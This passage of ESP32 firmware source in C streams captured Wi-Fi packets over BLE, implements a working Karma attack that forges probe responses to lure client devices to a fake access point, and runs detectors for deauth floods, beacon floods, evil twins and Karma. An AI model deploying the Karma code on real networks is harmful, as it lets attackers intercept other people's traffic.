    s_pcap_emitted = 0;
    s_pcap_dropped = 0;
    s_pcap_start_us = start_us;
    s_pcap_last_emit_us = 0;

    // Filtro do hardware: combina os tipos solicitados.
    uint32_t hw_mask = 0;
    if (ctx->filter & SNIFF_PCAP_FILTER_MGMT) hw_mask |= WIFI_PROMIS_FILTER_MASK_MGMT;
    if (ctx->filter & SNIFF_PCAP_FILTER_DATA) hw_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
    if (ctx->filter & SNIFF_PCAP_FILTER_CTRL) hw_mask |= WIFI_PROMIS_FILTER_MASK_CTRL;
    wifi_promiscuous_filter_t filter = { .filter_mask = hw_mask };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_pcap_done(0, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_pcap);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    while (!s_stop && esp_timer_get_time() < deadline_us) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_pcap_done(s_pcap_emitted, s_pcap_dropped, elapsed, 0);
    ESP_LOGI(TAG, "pcap done: emitted=%u dropped=%u in %u ms",
             (unsigned)s_pcap_emitted, (unsigned)s_pcap_dropped,
             (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_pcap_start(uint8_t channel, uint8_t filter,
                                 const uint8_t *bssid,
                                 uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if ((filter & SNIFF_PCAP_FILTER_ALL) == 0) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0)   duration_sec = 60;
    if (duration_sec > 300)  duration_sec = 300;

    pcap_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->channel = channel;
    ctx->filter = filter & SNIFF_PCAP_FILTER_ALL;
    ctx->duration_sec = duration_sec;
    if (bssid) {
        memcpy(ctx->bssid, bssid, 6);
        ctx->has_bssid = true;
    }

    s_mode = SNIFF_MODE_PCAP;
    s_stop = false;
    if (xTaskCreate(pcap_task, "pcap_stream", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "pcap_start: ch=%u filter=0x%02x bssid=%s dur=%us",
             channel, filter, ctx->has_bssid ? "yes" : "no",
             (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_pcap_stop(void)
{
    if (s_mode != SNIFF_MODE_PCAP) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Karma attack — responde a probe requests com probe response forjado
// ----------------------------------------------------------------------

// Probe Response template (header 24B + body fixo 12B = 36B fixo, mesmo
// shape do beacon mas com FC subtype=0x5).
//   FC: 0x50 0x00 (type=Mgmt, subtype=ProbeResp)
//   addr1: dest = source MAC do probe req (preenchido em runtime)
//   addr2: source = nosso BSSID fake (preenchido)
//   addr3: BSSID = nosso BSSID fake
static const uint8_t s_probe_resp_head[36] = {
    0x50, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr1: client (preenchido)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr2: BSSID (preenchido)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr3: BSSID (preenchido)
    0x00, 0x00,                                  // sequence
    0, 0, 0, 0, 0, 0, 0, 0,                      // timestamp
    0x64, 0x00,                                  // beacon interval 100 TU
    0x21, 0x04,                                  // capability: ESS + Short Slot
};

#define KARMA_MAX_DEDUP   128
#define KARMA_SSID_MAX    32

typedef struct {
    uint8_t mac[6];
    uint8_t ssid_len;
    char    ssid[KARMA_SSID_MAX];
} karma_seen_t;

typedef struct {
    uint8_t  channel;
    uint16_t duration_sec;
} karma_ctx_t;

static karma_seen_t *s_karma_seen = NULL;
static volatile size_t s_karma_seen_count = 0;
static volatile uint16_t s_karma_hits = 0;
static volatile uint16_t s_karma_unique_clients = 0;
static volatile uint16_t s_karma_unique_ssids = 0;

static void karma_make_bssid(uint8_t out[6], const char *ssid, uint8_t ssid_len)
{
    uint32_t h = 2166136261u;
    for (uint8_t i = 0; i < ssid_len; i++) {
        h ^= (uint8_t)ssid[i];
        h *= 16777619u;
    }
    out[0] = 0x02;
    out[1] = (uint8_t)((h >> 24) & 0xFF);
    out[2] = (uint8_t)((h >> 16) & 0xFF);
    out[3] = (uint8_t)((h >> 8) & 0xFF);
    out[4] = (uint8_t)(h & 0xFF);
    out[5] = (uint8_t)(ssid_len & 0xFF);
}

// Verifica se (mac, ssid) já visto. Se não, adiciona e retorna true.
// Também atualiza contadores de unique clients/ssids.
static bool karma_track_unique(const uint8_t mac[6], const uint8_t *ssid,
                                uint8_t ssid_len)
{
    bool mac_seen = false;
    bool ssid_seen = false;
    bool pair_seen = false;
    for (size_t i = 0; i < s_karma_seen_count; i++) {
        if (memcmp(s_karma_seen[i].mac, mac, 6) == 0) mac_seen = true;
        if (s_karma_seen[i].ssid_len == ssid_len &&
            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) ssid_seen = true;
        if (mac_seen && ssid_seen &&
            memcmp(s_karma_seen[i].mac, mac, 6) == 0 &&
            s_karma_seen[i].ssid_len == ssid_len &&
            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) {
            pair_seen = true;
        }
    }
    if (pair_seen) return false;
    if (s_karma_seen_count >= KARMA_MAX_DEDUP) return false; // limite

    memcpy(s_karma_seen[s_karma_seen_count].mac, mac, 6);
    s_karma_seen[s_karma_seen_count].ssid_len = ssid_len;
    if (ssid_len) memcpy(s_karma_seen[s_karma_seen_count].ssid, ssid, ssid_len);
    s_karma_seen_count++;

    if (!mac_seen) s_karma_unique_clients++;
    if (!ssid_seen) s_karma_unique_ssids++;
    return true;
}

static void emit_karma_hit(const uint8_t mac[6], const uint8_t *ssid,
                            uint8_t ssid_len)
{
    uint8_t payload[7 + KARMA_SSID_MAX];
    memcpy(&payload[0], mac, 6);
    payload[6] = ssid_len;
    if (ssid_len) memcpy(&payload[7], ssid, ssid_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_KARMA_HIT, s_seq++,
                           payload, 7 + ssid_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_karma_done(uint16_t hits, uint16_t clients, uint16_t ssids,
                             uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[11];
    payload[0]  = (uint8_t)(hits >> 8);
    payload[1]  = (uint8_t)(hits & 0xFF);
    payload[2]  = (uint8_t)(clients >> 8);
    payload[3]  = (uint8_t)(clients & 0xFF);
    payload[4]  = (uint8_t)(ssids >> 8);
    payload[5]  = (uint8_t)(ssids & 0xFF);
    payload[6]  = (uint8_t)(elapsed_ms >> 24);
    payload[7]  = (uint8_t)(elapsed_ms >> 16);
    payload[8]  = (uint8_t)(elapsed_ms >> 8);
    payload[9]  = (uint8_t)(elapsed_ms & 0xFF);
    payload[10] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_KARMA_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

// Forja e envia probe response pra o cliente que mandou o probe req.
static void send_probe_response(const uint8_t client_mac[6],
                                 const uint8_t *ssid, uint8_t ssid_len,
                                 uint8_t channel)
{
    uint8_t bssid[6];
    karma_make_bssid(bssid, (const char *)ssid, ssid_len);

    // header(36) + ssid(2+32) + rates(2+4) + DS(2+1) + ERP(2+1) + ExtRates(2+4)
    uint8_t frame[36 + 34 + 6 + 3 + 3 + 6];
    size_t off = 0;

    memcpy(&frame[off], s_probe_resp_head, sizeof(s_probe_resp_head));
    memcpy(&frame[4],  client_mac, 6);   // addr1: dest = client
    memcpy(&frame[10], bssid,      6);   // addr2: source = BSSID
    memcpy(&frame[16], bssid,      6);   // addr3: BSSID
    off += sizeof(s_probe_resp_head);

    // SSID IE
    frame[off++] = 0x00;
    frame[off++] = ssid_len;
    if (ssid_len) memcpy(&frame[off], ssid, ssid_len);
    off += ssid_len;

    // Supported Rates
    frame[off++] = 0x01; frame[off++] = 0x04;
    frame[off++] = 0x82; frame[off++] = 0x84; frame[off++] = 0x8B; frame[off++] = 0x96;

    // DS Parameter
    frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = channel;

    // ERP IE
    frame[off++] = 0x2A; frame[off++] = 0x01; frame[off++] = 0x00;

    // Extended Supported Rates
    frame[off++] = 0x32; frame[off++] = 0x04;
    frame[off++] = 0x0C; frame[off++] = 0x12; frame[off++] = 0x18; frame[off++] = 0x60;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
}

static volatile uint8_t s_karma_channel = 0;

static void promisc_cb_karma(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 4) return;
    if (p[0] != 0x40) return; // probe request

    const uint8_t *src = &p[10];
    const uint8_t *ies = &p[24];
    uint16_t ies_len = len - 24 - 4;
    if (ies_len < 2) return;
    if (ies[0] != 0x00) return;
    uint8_t ssid_len = ies[1];
    if (ssid_len == 0) return;       // só direcionados
    if (ssid_len > KARMA_SSID_MAX) ssid_len = KARMA_SSID_MAX;
    if (2 + ssid_len > ies_len) return;
    const uint8_t *ssid = &ies[2];

    // Sempre responde (KARMA agressivo); dedup só pra controlar quantos
    // hits novos emitir via TLV.
    send_probe_response(src, ssid, ssid_len, s_karma_channel);
    s_karma_hits++;

    if (karma_track_unique(src, ssid, ssid_len)) {
        emit_karma_hit(src, ssid, ssid_len);
    }
}

static void karma_task(void *arg)
{
    karma_ctx_t *ctx = (karma_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_karma_seen = calloc(KARMA_MAX_DEDUP, sizeof(karma_seen_t));
    if (!s_karma_seen) {
        emit_karma_done(0, 0, 0, 0, 2);
        goto cleanup;
    }
    s_karma_seen_count = 0;
    s_karma_hits = 0;
    s_karma_unique_clients = 0;
    s_karma_unique_ssids = 0;
    s_karma_channel = ctx->channel;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_karma_done(0, 0, 0, 0, 2);
        goto cleanup_dedup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_karma);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    while (!s_stop && esp_timer_get_time() < deadline_us) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_karma_done(s_karma_hits, s_karma_unique_clients,
                    s_karma_unique_ssids, elapsed, 0);
    ESP_LOGI(TAG, "karma done: %u hits, %u clients, %u ssids in %u ms",
             (unsigned)s_karma_hits, (unsigned)s_karma_unique_clients,
             (unsigned)s_karma_unique_ssids, (unsigned)elapsed);

cleanup_dedup:
    free(s_karma_seen);
    s_karma_seen = NULL;
cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_karma_start(uint8_t channel, uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0)   duration_sec = 60;
    if (duration_sec > 300)  duration_sec = 300;

    karma_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_KARMA;
    s_stop = false;
    if (xTaskCreate(karma_task, "karma", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "karma started on ch=%u for %us",
             channel, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_karma_stop(void)
{
    if (s_mode != SNIFF_MODE_KARMA) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Defense monitor — detectores deauth, beacon_flood, evil_twin, karma
// ----------------------------------------------------------------------

#define DEF_BSSID_SET_CAP    64
#define DEF_SSID_TABLE_CAP   32
#define DEF_DEAUTH_THRESHOLD 5     // frames/s pra disparar alerta
#define DEF_FLOOD_THRESHOLD  20    // unique BSSIDs/s
#define DEF_WINDOW_MS        1000  // janela deslizante de 1s
#define DEF_ALERT_COOLDOWN_MS 3000 // não spammar mesmo alerta

typedef struct {
    char ssid[33];
    uint8_t ssid_len;
    uint8_t bssid_a[6];   // primeiro BSSID visto
    int8_t  rssi_a;
    uint8_t bssid_b[6];   // segundo (se houver)
    int8_t  rssi_b;
    bool    has_b;
    bool    alerted;
} ssid_entry_t;

typedef struct {
    uint8_t  mask;
    uint8_t  channel;     // 0 = hop
    uint8_t  ch_min, ch_max;
    uint16_t dwell_ms;
    uint16_t duration_sec;
} defense_ctx_t;

// Estado defense (acessado tanto na promisc CB quanto na controller task)
static volatile uint8_t s_def_mask = 0;
static volatile uint16_t s_def_deauth_count = 0;
static volatile uint16_t s_def_beacon_count = 0;

// Sets/tables — modificados na CB (single producer) e lidos na task
static uint8_t s_def_bssid_set[DEF_BSSID_SET_CAP][6];
static volatile size_t s_def_bssid_count = 0;
static ssid_entry_t s_def_ssids[DEF_SSID_TABLE_CAP];
static volatile size_t s_def_ssid_count = 0;

// Cooldown timestamps por tipo (last alert µs)
static int64_t s_def_last_alert_us[4] = {0};

// Contadores totais pro DONE final
static uint32_t s_def_total_deauth = 0;
static uint32_t s_def_total_beacons = 0;
static uint16_t s_def_total_alerts = 0;

static void emit_defense_deauth(const uint8_t bssid[6], uint16_t count, uint16_t window_ms)
{
    uint8_t payload[10];
    memcpy(&payload[0], bssid, 6);
    payload[6] = (uint8_t)(count >> 8);   payload[7] = (uint8_t)(count & 0xFF);
    payload[8] = (uint8_t)(window_ms >> 8); payload[9] = (uint8_t)(window_ms & 0xFF);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_DEFENSE_DEAUTH, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_defense_beacon_flood(uint16_t unique_count, uint16_t window_ms,
                                       uint16_t total_beacons)
{
    uint8_t payload[6];
    payload[0] = (uint8_t)(unique_count >> 8); payload[1] = (uint8_t)(unique_count & 0xFF);
    payload[2] = (uint8_t)(window_ms >> 8);    payload[3] = (uint8_t)(window_ms & 0xFF);
    payload[4] = (uint8_t)(total_beacons >> 8);payload[5] = (uint8_t)(total_beacons & 0xFF);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_DEFENSE_BEACON_FLOOD, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_defense_evil_twin(const ssid_entry_t *e)
{
    uint8_t payload[1 + 33 + 6 + 1 + 6 + 1];
    size_t off = 0;
    payload[off++] = e->ssid_len;
    memcpy(&payload[off], e->ssid, e->ssid_len); off += e->ssid_len;
    memcpy(&payload[off], e->bssid_a, 6); off += 6;
    payload[off++] = (uint8_t)e->rssi_a;
    memcpy(&payload[off], e->bssid_b, 6); off += 6;
    payload[off++] = (uint8_t)e->rssi_b;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_DEFENSE_EVIL_TWIN, s_seq++,
                           payload, off);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_defense_karma(const uint8_t bssid[6], int8_t rssi,
                                const uint8_t *ssid, uint8_t ssid_len)
{
    uint8_t payload[8 + 33];
    memcpy(&payload[0], bssid, 6);
    payload[6] = (uint8_t)rssi;
    payload[7] = ssid_len;
    if (ssid_len) memcpy(&payload[8], ssid, ssid_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_DEFENSE_KARMA, s_seq++,
                           payload, 8 + ssid_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_defense_done(uint16_t alerts, uint32_t total_deauth,
                                uint32_t total_beacons, uint32_t elapsed_ms,
                                uint8_t status)
{
    uint8_t payload[15];
    payload[0]  = (uint8_t)(alerts >> 8);        payload[1] = (uint8_t)(alerts & 0xFF);
    payload[2]  = (uint8_t)(total_deauth >> 24); payload[3] = (uint8_t)(total_deauth >> 16);
    payload[4]  = (uint8_t)(total_deauth >> 8);  payload[5] = (uint8_t)(total_deauth & 0xFF);
    payload[6]  = (uint8_t)(total_beacons >> 24);payload[7] = (uint8_t)(total_beacons >> 16);
    payload[8]  = (uint8_t)(total_beacons >> 8); payload[9] = (uint8_t)(total_beacons & 0xFF);
    payload[10] = (uint8_t)(elapsed_ms >> 24);   payload[11] = (uint8_t)(elapsed_ms >> 16);
    payload[12] = (uint8_t)(elapsed_ms >> 8);    payload[13] = (uint8_t)(elapsed_ms & 0xFF);
    payload[14] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_DEFENSE_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

// Verifica se BSSID já está no set; se não, adiciona. Retorna true se NOVO.
static bool def_bssid_set_add(const uint8_t bssid[6])
{
    for (size_t i = 0; i < s_def_bssid_count; i++) {
        if (memcmp(s_def_bssid_set[i], bssid, 6) == 0) return false;
    }
    if (s_def_bssid_count >= DEF_BSSID_SET_CAP) return false;
    memcpy(s_def_bssid_set[s_def_bssid_count++], bssid, 6);
    return true;
}

// Procura SSID na tabela. Retorna ptr ou NULL. Se não achar, cria entry.
static ssid_entry_t *def_ssid_find_or_add(const uint8_t *ssid, uint8_t ssid_len)
{
    for (size_t i = 0; i < s_def_ssid_count; i++) {
        if (s_def_ssids[i].ssid_len == ssid_len &&
            memcmp(s_def_ssids[i].ssid, ssid, ssid_len) == 0) {
            return &s_def_ssids[i];
        }
    }
    if (s_def_ssid_count >= DEF_SSID_TABLE_CAP) return NULL;
    ssid_entry_t *e = &s_def_ssids[s_def_ssid_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->ssid, ssid, ssid_len);
    e->ssid_len = ssid_len;
    return e;
}

// Cooldown: se passou X ms desde último alerta deste tipo, autoriza emit.
// Retorna true se autorizado (e atualiza timestamp).
static bool def_alert_authorized(int idx)
{
    int64_t now = esp_timer_get_time();
    if (now - s_def_last_alert_us[idx] < (int64_t)DEF_ALERT_COOLDOWN_MS * 1000) {
        return false;
    }
    s_def_last_alert_us[idx] = now;
    return true;
}

static void promisc_cb_defense(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 4) return;

    uint8_t fc0 = p[0];
    int8_t rssi = pkt->rx_ctrl.rssi;

    // Deauth (0xC0) ou Disassoc (0xA0)
    if ((s_def_mask & DEFENSE_DETECT_DEAUTH) &&
        (fc0 == 0xC0 || fc0 == 0xA0)) {
        s_def_deauth_count++;
        s_def_total_deauth++;
        return;
    }

    // Beacon (0x80) ou Probe Resp (0x50): disparam evil_twin / karma /
    // beacon_flood
    if (fc0 != 0x80 && fc0 != 0x50) return;

    s_def_total_beacons++;

    const uint8_t *bssid = &p[16]; // addr3 in mgmt = BSSID
    if (s_def_mask & DEFENSE_DETECT_BEACON_FLOOD) {
        if (def_bssid_set_add(bssid)) {
            s_def_beacon_count = (uint16_t)s_def_bssid_count;
        }
    }

    // Parse SSID IE (offset 36 do beacon body: 24 hdr + 12 fixed body)
    if (!(s_def_mask & (DEFENSE_DETECT_EVIL_TWIN | DEFENSE_DETECT_KARMA))) return;
    if (len < 24 + 12 + 2 + 4) return;
    const uint8_t *ies = &p[24 + 12];
    uint16_t ies_len = len - (24 + 12) - 4; // -FCS
    if (ies_len < 2) return;
    if (ies[0] != 0x00) return;
    uint8_t ssid_len = ies[1];
    if (ssid_len == 0 || ssid_len > 32) return;
    if (2 + ssid_len > ies_len) return;
    const uint8_t *ssid = &ies[2];

    // Karma detector: BSSID com bit "locally administered" setado é
    // suspeito (real APs usam OUIs públicos da IEEE).
    if (s_def_mask & DEFENSE_DETECT_KARMA) {
        if ((bssid[0] & 0x02) && def_alert_authorized(3)) {
            s_def_total_alerts++;
            uint8_t bssid_copy[6]; memcpy(bssid_copy, bssid, 6);
            uint8_t ssid_copy[33]; memcpy(ssid_copy, ssid, ssid_len);
            emit_defense_karma(bssid_copy, rssi, ssid_copy, ssid_len);
        }
    }

    // Evil twin: track SSID → BSSIDs distintos
    if (s_def_mask & DEFENSE_DETECT_EVIL_TWIN) {
        ssid_entry_t *e = def_ssid_find_or_add(ssid, ssid_len);
        if (!e) return;
        if (e->bssid_a[0] == 0 && e->bssid_a[1] == 0 && e->bssid_a[2] == 0 &&
            e->bssid_a[3] == 0 && e->bssid_a[4] == 0 && e->bssid_a[5] == 0) {
            // primeiro BSSID
            memcpy(e->bssid_a, bssid, 6);
            e->rssi_a = rssi;
        } else if (memcmp(e->bssid_a, bssid, 6) != 0 && !e->has_b) {
            // 2º BSSID diferente — possível evil twin
            memcpy(e->bssid_b, bssid, 6);
            e->rssi_b = rssi;
            e->has_b = true;
            if (!e->alerted && def_alert_authorized(2)) {
                s_def_total_alerts++;
                e->alerted = true;
                emit_defense_evil_twin(e);
                // Watchdog hook: se ativo, dispara contra-ação
                watchdog_hook_evil_twin(e->bssid_a, e->rssi_a,
                                         e->bssid_b, e->rssi_b,
                                         s_current_channel);
            }
        }
    }
}

static void defense_task(void *arg)
{
    defense_ctx_t *ctx = (defense_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = ctx->duration_sec
        ? start_us + (int64_t)ctx->duration_sec * 1000000LL
        : start_us + (int64_t)3600 * 1000000LL; // cap 1h se duration=0

    s_def_mask = ctx->mask;
    s_def_deauth_count = 0;
    s_def_beacon_count = 0;
    s_def_bssid_count = 0;
    s_def_ssid_count = 0;
    s_def_total_deauth = 0;
    s_def_total_beacons = 0;
    s_def_total_alerts = 0;
    memset(s_def_last_alert_us, 0, sizeof(s_def_last_alert_us));

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_defense_done(0, 0, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_defense);

    bool hop = (ctx->channel == 0);
    uint8_t ch = hop ? ctx->ch_min : ctx->channel;
    s_current_channel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    int64_t window_start_us = esp_timer_get_time();
    int64_t hop_until_us = window_start_us + (hop ? ctx->dwell_ms * 1000 : INT64_MAX/2);

    while (!s_stop && esp_timer_get_time() < deadline_us) {
        vTaskDelay(pdMS_TO_TICKS(200));
        int64_t now = esp_timer_get_time();

        // Channel hop tick
        if (hop && now >= hop_until_us) {
            ch = (ch >= ctx->ch_max) ? ctx->ch_min : (ch + 1);
            s_current_channel = ch;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            hop_until_us = now + ctx->dwell_ms * 1000;
        }

        // Janela de 1s — checa thresholds e reseta
        if (now - window_start_us >= (int64_t)DEF_WINDOW_MS * 1000) {
            uint16_t da = s_def_deauth_count;
            uint16_t un = s_def_beacon_count;

            if ((s_def_mask & DEFENSE_DETECT_DEAUTH) && da >= DEF_DEAUTH_THRESHOLD) {
                if (def_alert_authorized(0)) {
                    s_def_total_alerts++;
                    // BSSID alvo: o último visto não é representativo;
                    // emit broadcast (ff..ff) — app pode correlacionar com pcap.
                    uint8_t any[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
                    emit_defense_deauth(any, da, DEF_WINDOW_MS);
                }
            }
            if ((s_def_mask & DEFENSE_DETECT_BEACON_FLOOD) && un >= DEF_FLOOD_THRESHOLD) {
                if (def_alert_authorized(1)) {
                    s_def_total_alerts++;
                    emit_defense_beacon_flood(un, DEF_WINDOW_MS, s_def_total_beacons);
                }
            }

            // Reset window
            s_def_deauth_count = 0;
            s_def_beacon_count = 0;
            s_def_bssid_count = 0;
            window_start_us = now;
        }
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_defense_done(s_def_total_alerts, s_def_total_deauth,
                      s_def_total_beacons, elapsed, 0);
    ESP_LOGI(TAG, "defense done: %u alerts, %lu deauth, %lu beacons in %u ms",
             (unsigned)s_def_total_alerts,
             (unsigned long)s_def_total_deauth,
             (unsigned long)s_def_total_beacons,
             (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_defense_start(uint8_t mask,
                                    uint8_t channel,
                                    uint8_t ch_min, uint8_t ch_max,
                                    uint16_t dwell_ms,
                                    uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if ((mask & DEFENSE_DETECT_ALL) == 0) return ESP_ERR_INVALID_ARG;

    if (channel == 0) {
        // hop mode
        if (ch_min == 0 || ch_min > 13) ch_min = 1;
        if (ch_max == 0 || ch_max > 13) ch_max = 13;
        if (ch_max < ch_min) return ESP_ERR_INVALID_ARG;
        if (dwell_ms < 100) dwell_ms = 100;
        if (dwell_ms > 5000) dwell_ms = 5000;
    } else {
        if (channel > 13) return ESP_ERR_INVALID_ARG;
    }
    if (duration_sec > 3600) duration_sec = 3600;

    defense_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->mask = mask & DEFENSE_DETECT_ALL;
    ctx->channel = channel;
    ctx->ch_min = ch_min;
    ctx->ch_max = ch_max;
    ctx->dwell_ms = dwell_ms;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_DEFENSE;
    s_stop = false;
    if (xTaskCreate(defense_task, "defense", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "defense started: mask=0x%02x ch=%u (%u..%u) dwell=%ums dur=%us",
             mask, channel, ch_min, ch_max, (unsigned)dwell_ms,
             (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_defense_stop(void)
{
    if (s_mode != SNIFF_MODE_DEFENSE) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}
